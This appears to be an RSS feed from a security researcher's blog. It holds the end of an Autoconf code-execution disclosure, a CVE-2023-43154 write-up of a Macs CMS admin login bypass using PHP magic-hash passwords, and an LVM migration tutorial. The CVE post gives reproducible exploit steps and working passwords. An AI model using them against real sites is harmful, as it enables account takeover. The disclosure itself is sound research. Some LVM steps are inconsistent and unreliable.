&lt;p&gt;This can be abused to perform targeted cyberattacks on developers, general Linux users, security researchers, and more if the supply chain is compromised. Additionally, because this is not well-known, modern code-scanning and SAST solutions often fail to include checks for malicious code within &lt;code&gt;configure.ac&lt;/code&gt;, decreasing the chance of detection.&lt;/p&gt;
&lt;p&gt;I discuss exactly how to exploit this in my &lt;a href=&#34;https://github.com/ally-petitt/autoconf-code-execution&#34;&gt;Proof-of-Concept&lt;/a&gt; on GitHub, which was published after receiving permission from the Autoconf maintainers to publicly disclose my concerns.&lt;/p&gt;
&lt;h1 id=&#34;how-hard-was-this-tofind&#34;&gt;How Hard Was This To Find?&lt;/h1&gt;
&lt;p&gt;I want to briefly explain the ease with which I was able to uncover this potentially dangerous functionality. First, I identified the programming language being used was M4, so I read &lt;a href=&#34;https://mbreen.com/m4.html&#34;&gt;core notes&lt;/a&gt; for approximately 30 minutes to get a high-level overview of the language.&lt;/p&gt;
&lt;p&gt;After experimenting with the functionality and realizing that it was possible to embed bash code in the created &lt;code&gt;configure&lt;/code&gt; script, I wondered if I could take it a step further and get code execution from running &lt;code&gt;autoconf&lt;/code&gt; alone.&lt;/p&gt;
&lt;p&gt;Within 2 hours of combing through the source code to learn how the application works, I identified 3 potential locations for code to be executed. I then created a &lt;a href=&#34;https://github.com/ally-petitt/autoconf-code-execution&#34;&gt;PoC&lt;/a&gt; to submit in a bug report to the Autoconf maintainers.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*H4i_I34WTV0KbZE5&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://seeklogo.com/images/M/m4-logo-88B85DB5FB-seeklogo.com.png&#34;&gt;https://seeklogo.com/images/M/m4-logo-88B85DB5FB-seeklogo.com.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;My findings were low-hanging fruits and I suspect they have only gone this long without being abused because of the learning curve to understand M4. As you will see in the next segment, I am far from the first to know of this functionality.&lt;/p&gt;
&lt;h1 id=&#34;autoconfs-response&#34;&gt;Autoconf’s Response&lt;/h1&gt;
&lt;p&gt;Since 2/3 of my concerns came from a segment of legacy code that has been unused since the year 2000, one of the maintainers removed the macro in &lt;a href=&#34;https://git.savannah.gnu.org/cgit/autoconf.git/commit/?id=11d8824daada20055c855f46ad7c45237c1ff455&#34;&gt;this commit&lt;/a&gt; and thanked me for bringing the unused code snippets to their attention.&lt;/p&gt;
&lt;p&gt;They explained to me that there were plenty of opportunities to execute code when using Autoconf and that the ability to invoke macros such as &lt;code&gt;m4_syscmd&lt;/code&gt;, allowing for code execution, was a conscious design decision as many of their users rely on that functionality. In fact, it is common for &lt;code&gt;m4_syscmd&lt;/code&gt; to be used to run commands such as &lt;code&gt;git describe&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Another of the points in my PoC was that they included a macro that executed the &lt;code&gt;cat&lt;/code&gt; command without an absolute path. This made the program vulnerable to the modification of a $PATH environmental variable which could lead to execute arbitrary code execution and privilege escalation under the correct circumstances.&lt;/p&gt;
&lt;p&gt;The maintainers explained that adding an absolute path to the binary would break Nix, Guix, and more. They made the assumption that Autoconf is being run in an environment with a secure $PATH within a sandbox, which is consistent with best practices. However, I have strong doubts that the majority of users actually follow these precautions.&lt;/p&gt;
&lt;h1 id=&#34;implications&#34;&gt;Implications&lt;/h1&gt;
&lt;p&gt;I want to be clear that I respect the maintainers and the effort and time they have put into creating a tool that we have all benefited from. The ability to execute OS commands is not inherently dangerous, but when abused it can certainly have security implications.&lt;/p&gt;
&lt;p&gt;Given the reliance on &lt;code&gt;m4_syscmd&lt;/code&gt; by Autoconf’s clientele, it is clear to me that the maintainers have no plans of removing the functionality. The ability to execute arbitrary code upon running &lt;code&gt;autoconf&lt;/code&gt; will remain in the foreseeable future, making it an even more attractive attack vector for adversaries.&lt;/p&gt;
&lt;p&gt;In fact, the manner in which this functionality is built-in is reminiscent of attack techniques displayed in &lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;GTFObins&lt;/a&gt;, which are often used for privilege escalation.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The ability to run commands from Autoconf is a feature, not a bug. However, it is a feature that can be abused in a way that very few people are aware of. And when exploited strategically, this can lead to the infection or damage of thousands of devices.&lt;/p&gt;
&lt;p&gt;I hope that in writing this, I was able to bring awareness to open-source users on the potential dangers of configuring untrusted applications. If you have any questions, concerns, or criticisms on this article, feel free to message me on &lt;a href=&#34;https://www.linkedin.com/in/ally-petitt/&#34;&gt;LinkedIn&lt;/a&gt; and I will be happy to discuss them with you.&lt;/p&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How I Found an Authentication Bypass Vulnerability — CVE-2023–43154</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-09-29_how-i-found-authentication-bypass-vulnerability---cve-2023-43154-b55dee7c876b/</link>
      <pubDate>Fri, 29 Sep 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-09-29_how-i-found-authentication-bypass-vulnerability---cve-2023-43154-b55dee7c876b/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*3hIZtNoj0lfZ86_b&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://images.pexels.com/photos/5483149/pexels-photo-5483149.jpeg?auto=compress&amp;amp;amp;cs=tinysrgb&amp;amp;amp;w=1260&amp;amp;amp;h=750&amp;amp;amp;dpr=1&#34;&gt;https://images.pexels.com/photos/5483149/pexels-photo-5483149.jpeg?auto=compress&amp;amp;amp;cs=tinysrgb&amp;amp;amp;w=1260&amp;amp;amp;h=750&amp;amp;amp;dpr=1&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Discovering a CVE was always an idea that enticed me, but I had no idea how to achieve it. Encountering the authentication bypass that I will explain in this article was both unexpected and deeply inspiring. In my preparation for the OSWE, I decided to practice identifying the exam vulnerabilities in real, open-source applications, which would both give me practice for the exam and enable me to contribute to the security community. The first of these applications is the subject of this article.&lt;/p&gt;
&lt;h2 id=&#34;prerequisite-knowledge&#34;&gt;Prerequisite Knowledge&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;A basic understanding of scripting languages and web applications&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;setup&#34;&gt;Setup&lt;/h2&gt;
&lt;p&gt;I decided to audit &lt;a href=&#34;https://www.opensourcecms.com/macs-cms/&#34;&gt;Macs Framework v1.14f&lt;/a&gt;. The reasoning behind this target choice is that I wanted to gain familiarity with analyzing large code bases before challenging myself with a more modern target in order to establish a robust methodology. Additionally, Macs CMS seemed like a target that was compatible with the machines used in the OSWE certification exams and the additional preparation would increase my chance of passing on the first attempt.&lt;/p&gt;
&lt;p&gt;My first attempt to launch the web application locally was unsuccessful. I was unable to install the deprecated PHP5 version on my host OS. As a solution, I decided to run the application in a Docker container. I made a &lt;code&gt;Dockerfile&lt;/code&gt; in the &lt;code&gt;Application/&lt;/code&gt; folder of the source code. I was unable to find documentation or online resources as to the process of configuring this CMS, so after some tweaking, I composed the following &lt;code&gt;Dockerfile&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FROM php:5.6-apache  
COPY . /var/www/html/  
WORKDIR /var/www/html  
  
# add working apt sources  
RUN echo deb http://archive.debian.org/debian/ stretch main &amp;gt; /etc/apt/sources.list  
RUN echo deb http://archive.debian.org/debian-security/ stretch/updates main &amp;gt;&amp;gt; /etc/apt/sources.list  
  
# install mysql  
RUN apt-get update &amp;amp;&amp;amp; \  
 apt-get install -y mysql-server &amp;amp;&amp;amp; \  
 apt-get clean  
  
# remove symlinks on error logs  
RUN unlink /var/log/apache2/error.log &amp;amp;&amp;amp; \  
 unlink /var/log/apache2/access.log  
  
# remove .htaccess file because it isn&amp;#39;t needed and it caused issues  
RUN rm /var/www/html/.htaccess  
  
# change ownership of web files to www-data  
RUN chown www-data /var/www/html -R &amp;amp;&amp;amp; \  
 chmod 755 /var/www/html -R  
  
# start mysql and apache2  
RUN service mysql restart  
RUN service apache2 restart
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I then built the new image and ran it as a container named &lt;code&gt;macs-cms.&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd Macs-CMS/Application  
sudo docker build -t macs-cms .  
sudo docker run -it -exec --name macs-cms macs-cms /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After these commands were complete, I was able to visit the live CMS at &lt;code&gt;&amp;lt;http://172.17.0.2&amp;gt;.&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;finding-cve-202343154&#34;&gt;Finding CVE-2023–43154&lt;/h1&gt;
&lt;p&gt;My first encounter with the source code aimed to identify key metadata that would provide context as to which vulnerabilities to look for. By briefly browsing the project in &lt;a href=&#34;https://vscodium.com/&#34;&gt;VSCodium&lt;/a&gt;’s project explorer and running enumeration commands on the Docker container, I was able to deduce the following information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Programming language:&lt;/strong&gt; PHP 5.6&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Architecture:&lt;/strong&gt; Model-View-Controller (MVC)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Routes:&lt;/strong&gt; Organized with the following pattern: &lt;code&gt;/&amp;lt;controller_name&amp;gt;/&amp;lt;function&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Database:&lt;/strong&gt; MariaDB 10.1.48&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Debian GNU/Linux 9&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Informed on the technology stack, I was able to focus my research on vulnerabilities that are common in PHP and MariaDB, one of which being PHP type confusion.&lt;/p&gt;
&lt;p&gt;I proceeded with navigating the web application and monitoring my HTTP traffic through my BurpSuite web proxy while taking notes on details that I deemed interesting for future vulnerability analysis. In particular, I honed in on the authentication functionality because of its potential to be high severity.&lt;/p&gt;
&lt;p&gt;Upon my login attempt as admin, I noticed the following traffic:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Pkekiat_JJKGXIKOXuDGpQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Intercepted login request&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The URI, excluding the prefix &lt;code&gt;index.php&lt;/code&gt;, was &lt;code&gt;/main/cms/login&lt;/code&gt;. My interpretation of this route is that the &lt;code&gt;mainController&lt;/code&gt; is initially called, which loads to the &lt;code&gt;CMS&lt;/code&gt; plugin with &lt;code&gt;$this-&amp;gt;cms = $this-&amp;gt;loadPlugin(&#39;CMS&#39;);&lt;/code&gt;. Then, the &lt;code&gt;login()&lt;/code&gt; function is invoked within the CMS plugin with access to the HTTP POST data, which is globally accessible.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*YiIswaTUkWAQg-oNymcuAg.png&#34; alt=&#34;&#34;  /&gt;

I visit the &lt;code&gt;login()&lt;/code&gt; function within the CMS plugin located at &lt;code&gt;plugins/CMS/controllers/CMS.php&lt;/code&gt; to discover that in order for the user to log in successfully, they must already be logged in as admin or the method &lt;code&gt;isValidLogin()&lt;/code&gt; must return &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*cf13zlJVAiQBLn4ZHPGXxg.png&#34; alt=&#34;&#34;  /&gt;

Since the return value of the function shown above must the &lt;code&gt;true&lt;/code&gt; and the value returned is stored in the variable &lt;code&gt;$loggedIn&lt;/code&gt;, I annotated the occurrences of &lt;code&gt;$loggedIn&lt;/code&gt; to highlight the execution flow that must be triggered in order to achieve the intended return value. From here, I began to work backwards.&lt;/p&gt;
&lt;p&gt;For &lt;code&gt;$loggedIn&lt;/code&gt; to be set to &lt;code&gt;true&lt;/code&gt;, a conditional statement must be met. Luckily, I noticed that a loose comparison was being made for both of the comparisons that can lead to the value being set to &lt;code&gt;true&lt;/code&gt;. This article will not be covering PHP loose comparison vulnerabilities in-depth, however, I will give a high-level overview of the relevant details of loose comparison and more detail can be found at &lt;a href=&#34;https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/&#34;&gt;this&lt;/a&gt; resource.&lt;/p&gt;
&lt;h2 id=&#34;loose-comparison-logic&#34;&gt;Loose Comparison Logic&lt;/h2&gt;
&lt;p&gt;In PHP, loose comparisons refer to the use of two equal signs (&lt;code&gt;==&lt;/code&gt;). This differs from a strict comparison (&lt;code&gt;===&lt;/code&gt;) in the way that two operands are compared. A loose comparison will attempt to interpret the operands and, if deemed applicable, convert them to a data type that allows for improved compatibility between them.&lt;/p&gt;
&lt;p&gt;The following example illustrates the difference between a strict and loose comparison in PHP. I make two comparisons between the string &lt;code&gt;“0e3264578”&lt;/code&gt; and the integer &lt;code&gt;0&lt;/code&gt;. The first is a loose comparison and the second is strict. The result of the comparison between the string and integer then outputs whether the comparison returned &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false.&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php  
if (&amp;#34;0e3264578&amp;#34; == 0) {  
 echo &amp;#34;Loose comparison returns True\n&amp;#34;;  
} else {  
 echo &amp;#34;Loose comparison returns False\n&amp;#34;;  
};  
  
if (&amp;#34;0e3264578&amp;#34; === 0) {  
 echo &amp;#34;Strict comparison returns True&amp;#34;;  
} else {  
 echo &amp;#34;Strict comparison returns False&amp;#34;;  
};  
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I save the above program as &lt;code&gt;test-comparison.php&lt;/code&gt; and execute the code to discover that the first, loose comparison returned &lt;code&gt;true&lt;/code&gt; and the second, strict comparison returned &lt;code&gt;false&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hSnIWCdKDG--lBGveEolvQ.png&#34; alt=&#34;&#34;  /&gt;

To understand why this is the case, it is important to understand what PHP is doing during a loose comparison like the one in this example. An integer followed by the letter &lt;code&gt;e&lt;/code&gt; and additional digits is interpreted by PHP as an integer raised to an exponential power. In this case, &lt;code&gt;“0e3264578”&lt;/code&gt; was interpreted as 0 raised to the &lt;code&gt;3264578&lt;/code&gt; power. Of course, 0³²⁶⁴⁵⁷⁸ is equal to 0, hence the return value of &lt;code&gt;true&lt;/code&gt; when comparing &lt;code&gt;“0e3264578”&lt;/code&gt; to &lt;code&gt;0.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This did not return &lt;code&gt;true&lt;/code&gt; in the strict comparison because PHP was not interpreting the string as an integer like it was in the loose comparison. It took the operands for their literal value, which was a string and an integer of different values, which are not the same.&lt;/p&gt;
&lt;p&gt;This can be abused in the context of a login form where two password hashes that are both 0-like such as “0e123” and “0e345” can be loosely compared and result in a &lt;code&gt;true&lt;/code&gt; outcome since 0¹²³ and 0³⁴⁵ both equal the same thing: 0. As a result, PHP would signal that the hashes are equivalent, allowing for a successful login, when they are not.&lt;/p&gt;
&lt;h2 id=&#34;formulating-theexploit&#34;&gt;Formulating the Exploit&lt;/h2&gt;
&lt;p&gt;To exploit this vulnerability, I needed to fully understand what the input in &lt;code&gt;isValidLogin()&lt;/code&gt; consists of. It is evident in the &lt;code&gt;login()&lt;/code&gt; function that there is manipulation done on the received password before it is passed to the &lt;code&gt;isValidLogin()&lt;/code&gt; function for comparison with previously stored credentials.&lt;/p&gt;
&lt;p&gt;Revisiting the initial function call, it appears that the user-controlled parameter &lt;code&gt;password&lt;/code&gt; is being passed through an additional method called &lt;code&gt;encrypt()&lt;/code&gt; before being passed to &lt;code&gt;isValidLogin().&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$this-&amp;gt;isValidLogin(Post::getByKey(&amp;#39;username&amp;#39;), $this-&amp;gt;encrypt(Post::getByKey(&amp;#39;password&amp;#39;)) )
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Visiting this function reveals that it simply returns an unsalted MD5 hash of the parameter passed into it, in this case, &lt;code&gt;password&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*a04RNWeykCU4OPm-t3CWSQ.png&#34; alt=&#34;&#34;  /&gt;

I did more digging to uncover that the password saved in the database was also hashed. This means that in the &lt;code&gt;isValidLogin()&lt;/code&gt; function, the password comparison is made between two MD5 hashes like the following:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$account[&amp;#39;password&amp;#39;] == $password // -&amp;gt; md5(user\_inputted\_password) == stored\_md5\_password\_hash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As explained before, in PHP, “0e123..” will be interpreted as 0 in a loose comparison. Hashes that follow this format (&lt;code&gt;0e&lt;/code&gt; followed by digits) are known as magic hashes. Theoretically, if we were to compare two magic hashes together, the result would be &lt;code&gt;true&lt;/code&gt; and the &lt;code&gt;$loggedIn&lt;/code&gt; variable would subsequently be set to true and returned to the &lt;code&gt;login()&lt;/code&gt; function resulting in a success authentication.&lt;/p&gt;
&lt;p&gt;I will first verify this with a sample PHP script that compares two different zero-like strings.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php  
if (&amp;#34;0e123123123&amp;#34; == &amp;#34;0e456456456&amp;#34;) {  
 echo &amp;#34;Comparison returns True\n&amp;#34;;  
} else {  
 echo &amp;#34;Comparison returns False\n&amp;#34;;  
};  
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As expected, executing the script results in a &lt;code&gt;true&lt;/code&gt; comparison.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*FDZGbf2o3aYsiVJnTI0kkQ.png&#34; alt=&#34;&#34;  /&gt;

Now, all that is left to do is reproduce this in the CMS application. Using my &lt;a href=&#34;https://github.com/spaze/hashes/blob/master/md5.md&#34;&gt;cheat sheet of magic hashes&lt;/a&gt;, I identify two magic hashes to use:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;fh70QgaGIfYM:0e564472166873750526572156675923  
hello10672785079:0e859173238273273455651853557908
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I create an test user called &lt;code&gt;test-admin&lt;/code&gt; with the first password &lt;code&gt;fh70QgaGIfYM&lt;/code&gt;. The intercepted request can be seen in BurpSuite on the right.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*dXa4uMZw2kGSoG3mqvgIeg.png&#34; alt=&#34;&#34;  /&gt;

Finally, for the moment of truth, I log out of my admin account and try to log in with the second password &lt;code&gt;hello10672785079&lt;/code&gt;. The resulting request is shown below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*caUiDSInsQ6owr2iKErNVQ.png&#34; alt=&#34;&#34;  /&gt;

The intercepted response of my login attempt returns a status code of 200 and redirects me to the home page, indicating a successful login.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*rGwiYW55r2P_iAi36kXF7w.png&#34; alt=&#34;&#34;  /&gt;

With my new administrator privileges, I can change configuration information about the site including the &lt;strong&gt;password of the other administrator&lt;/strong&gt;.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*H-JRAsYSEblniMQgPYm9Ew.png&#34; alt=&#34;&#34;  /&gt;

Conclusion&lt;/h1&gt;
&lt;p&gt;I was able to log in to an administrator account using one of many incorrect passwords that work to bypass authentication. This opened the door to potential breaches in confidentiality, integrity, and availability.&lt;/p&gt;
&lt;p&gt;As stated in my original PoC, there are limitations to this since the admin password hash must already be a 0-like string in PHP and the username must be previously known, 0-like, or easy to guess. The username can be enumerated on the platform through other means, so this is not as big of an issue.&lt;/p&gt;
&lt;p&gt;Thank you to everyone who read this far and I hope that you found value in this article!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How to safely convert to LVM without losing your data</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-08-19_how-to-safely-convert-to-lvm-without-losing-your-data-258ce044448/</link>
      <pubDate>Sat, 19 Aug 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-08-19_how-to-safely-convert-to-lvm-without-losing-your-data-258ce044448/</guid>
      <description>&lt;h1 id=&#34;introduction&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*es1LJrnEBsSNgXZM.png&#34; alt=&#34;&#34;  /&gt;

Introduction&lt;/h1&gt;
&lt;p&gt;This article is a walkthrough that demonstrates the solution to a particular situation that computer owners may encounter when updating their system. For readers who do not fit into the scenario listed below, this is also a great article for familiarizing yourself with the practical application of logical volume manager (LVM). Otherwise, feel free to modify your approach as works best with your scenario.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Scenario:&lt;/strong&gt; You have a hard drive with all your files on it that uses physical partitions. You just bought a new hard drive and would like to use both drives together to manage logical partitions rather than physical ones. You also don’t want to lose the data that was on your original physical partitions.&lt;/p&gt;
&lt;p&gt;As implied from above, the only requirements for this approach are that you have a system that can use LVM and you have a storage device with equal or greater size than the amount of data stored on the primary storage device. Additionally, it is assumed that you are using Linux.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; This has the potential to cause damage and potentially brick your system. Your implementation may also vary depending on your setup. Continue at your own risk.&lt;/p&gt;
&lt;h2 id=&#34;benefits-oflvm&#34;&gt;Benefits of LVM&lt;/h2&gt;
&lt;p&gt;The full scope of LVMs capabilities can be seen &lt;a href=&#34;https://man7.org/linux/man-pages/man8/lvm.8.html&#34;&gt;here&lt;/a&gt;. It is a flexible utility that offers unique advantages over traditional physical partitions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Grouping multiple drives into a single volume group&lt;/li&gt;
&lt;li&gt;Support for &lt;a href=&#34;https://en.wikipedia.org/wiki/Thin_provisioning&#34;&gt;thin provisioning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Snapshot capabilities that can be used for backups&lt;/li&gt;
&lt;li&gt;Easy to resize partitions and add/remove drives&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;More detail on the benefits can be found &lt;a href=&#34;https://linuxhint.com/whatis_logical_volume_management/&#34;&gt;here&lt;/a&gt;. We are now ready to discuss the steps to convert to LVM.&lt;/p&gt;
&lt;h1 id=&#34;steps-to-safely-convert-tolvm&#34;&gt;Steps to Safely Convert to LVM&lt;/h1&gt;
&lt;p&gt;For the purpose of this article, the primary storage device used will be referred to as &lt;code&gt;sda&lt;/code&gt; and the new storage device will be called &lt;code&gt;sdb&lt;/code&gt;. An overview of the plan is the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create LVM group on &lt;code&gt;sdb&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Copy data from &lt;code&gt;sda&lt;/code&gt;partitions to &lt;code&gt;sdb&lt;/code&gt; logical partitions&lt;/li&gt;
&lt;li&gt;Expand LVM group on &lt;code&gt;sdb&lt;/code&gt; to include unused &lt;code&gt;sda&lt;/code&gt; partitions&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;prerequisite&#34;&gt;Prerequisite&lt;/h2&gt;
&lt;p&gt;Install the LVM tools and &lt;code&gt;rsync&lt;/code&gt; with the command that is appropriate with your Linux distribution.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt-get install lvm2 rsync # For Ubuntu/Debian  
sudo pacman -Sy lvm2 rsync # Arch Linux
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;Create LVM group on &lt;code&gt;sdb&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a volume group called &lt;code&gt;myvg&lt;/code&gt; on &lt;code&gt;sdb&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo pvcreate /dev/sdb  
$ sudo vgcreate myvg /dev/sdb
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Create a logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a logical volume on the &lt;code&gt;myvg&lt;/code&gt; volume group to store the new data in. This one is named &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo lvcreate -n backup -L 300G myvg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To verify your progress, you can run the commands &lt;code&gt;sudo vgs&lt;/code&gt; and &lt;code&gt;sudo lvs&lt;/code&gt; to list the recently created volume groups and logical volumes.&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Mount the new logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a filesystem. For quick creation, just press the Enter key for each of the prompts.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo mkfs.ext4 /dev/myvg/backup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, create a mount point and mount the &lt;code&gt;backup&lt;/code&gt; logical volume to it.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo mkdir /mnt/backup  
sudo mount /dev/myvg/backup /mnt/backup
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Copy data to the logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Then, mount the partition that you would like to transfer onto a new mount point. For instance, I would like to transfer &lt;code&gt;sda3&lt;/code&gt; onto &lt;code&gt;backup&lt;/code&gt; so I will use the following command:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo mount /dev/sda3 /mnt/root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this case, &lt;code&gt;rsync&lt;/code&gt; will be used to transfer the files from &lt;code&gt;sda&lt;/code&gt; to &lt;code&gt;sdb&lt;/code&gt;. In this case, the 500GB portion of &lt;code&gt;sdb&lt;/code&gt; that was used to create the &lt;code&gt;backup&lt;/code&gt; logical volume. After, I will unmount the logical volume and physical partition.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo rsync -av /mnt/root /mnt/backup  
sudo umount /mnt/backup  
sudo umount /dev/root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Repeat steps 2–4 with all of the partitions that you with to preserve.&lt;/strong&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Expand the LVM volumes&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Now, we will add &lt;code&gt;sda2&lt;/code&gt; and &lt;code&gt;sda3&lt;/code&gt; into the volume group of LVM. In order to do this, we must initialize them as physical volumes and extend them to the volume group.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo pvcreate /dev/sdY  
sudo vgextend myvg /dev/sdY
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Add new partitions to fstab&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Finally, find the UUIDs of the new logical volumes with &lt;code&gt;lsblk -f&lt;/code&gt; and add those to your &lt;code&gt;/etc/fstab&lt;/code&gt; with the following syntax:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;UUID=&amp;lt;your-home-uuid&amp;gt; /home ext4 rw,relatime 0 2  
UUID=&amp;lt;your-root-uuid&amp;gt; / ext4 rw,relatime 0 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As always, make changes to the above configuration option if necessary.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;These are the steps that worked for me with my setup. I hope that you found this article helpful and informative. Feel free to reach out if you have any questions.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Beyond the Screen: The Hidden World of Firmware Security</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-08-05_beyond-the-screen--the-hidden-world-of-firmware-security-87b0ea6a20a4/</link>
      <pubDate>Sat, 05 Aug 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-08-05_beyond-the-screen--the-hidden-world-of-firmware-security-87b0ea6a20a4/</guid>
